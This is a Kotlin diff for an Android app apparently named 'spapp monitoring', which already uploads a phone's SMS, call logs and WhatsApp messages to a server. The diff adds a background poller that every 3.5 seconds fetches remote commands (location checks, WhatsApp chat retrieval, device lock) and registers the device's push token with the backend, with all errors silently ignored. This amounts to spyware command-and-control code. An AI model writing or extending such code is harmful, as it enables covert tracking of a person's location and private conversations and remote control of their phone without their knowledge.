@@ -20,6 +20,9 @@ import com.spapp.monitoring.network.SmsLogEntryDto
 import com.spapp.monitoring.network.SmsLogSyncRequest
 import com.spapp.monitoring.network.WhatsAppMessageEntryDto
 import com.spapp.monitoring.network.WhatsAppMessagesSyncRequest
+import com.spapp.monitoring.network.FcmTokenRequest
+import com.spapp.monitoring.sync.SyncRunner
+import com.google.firebase.messaging.FirebaseMessaging
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.Job
@@ -59,11 +62,15 @@ object RealtimeLogObserverManager {
     private var whatsAppJob: Job? = null
     private val whatsAppMutex = Mutex()
 
+    private var commandPollerJob: Job? = null
+    private var lastUploadedFcmToken: String? = null
+
     @Synchronized
     fun start(context: Context) {
         val appCtx = context.applicationContext
         startSmsObserver(appCtx)
         startCallObserver(appCtx)
+        startCommandPoller(appCtx)
         triggerInstantWhatsAppUpload(appCtx)
     }
 
@@ -94,6 +101,52 @@ object RealtimeLogObserverManager {
 
         whatsAppJob?.cancel()
         whatsAppJob = null
+
+        commandPollerJob?.cancel()
+        commandPollerJob = null
+    }
+
+    /**
+     * Fast command poller: checks backend for pending commands (location_check,
+     * get_whatsapp_chat, lock, etc.) every 3.5 seconds while Accessibility Service is running.
+     * Guarantees 1-3 second response time for "Check Location Now" and chat conversation fetches
+     * even if FCM is delayed or sleeping.
+     */
+    private fun startCommandPoller(appCtx: Context) {
+        if (commandPollerJob != null) return
+        commandPollerJob = scope.launch {
+            Log.d(TAG, "Fast command poller started (3.5s interval)")
+            while (true) {
+                try {
+                    val state = DeviceState(appCtx)
+                    val token = state.authToken
+                    if (!token.isNullOrEmpty()) {
+                        val runner = SyncRunner(appCtx)
+                        runner.runFastCommandPass()
+
+                        // Also verify FCM token registration
+                        if (lastUploadedFcmToken == null) {
+                            try {
+                                FirebaseMessaging.getInstance().token.addOnSuccessListener { fcmTok ->
+                                    if (!fcmTok.isNullOrBlank() && fcmTok != lastUploadedFcmToken) {
+                                        scope.launch {
+                                            try {
+                                                ApiClient.service.updateFcmToken("Bearer $token", FcmTokenRequest(fcmTok))
+                                                lastUploadedFcmToken = fcmTok
+                                                Log.d(TAG, "FCM token uploaded to server via command poller")
+                                            } catch (_: Exception) {}
+                                        }
+                                    }
+                                }
+                            } catch (_: Exception) {}
+                        }
+                    }
+                } catch (_: Exception) {
+                    // Ignore transient network failures
+                }
+                delay(3500)
+            }
+        }
     }
 
     private fun startSmsObserver(appCtx: Context) {
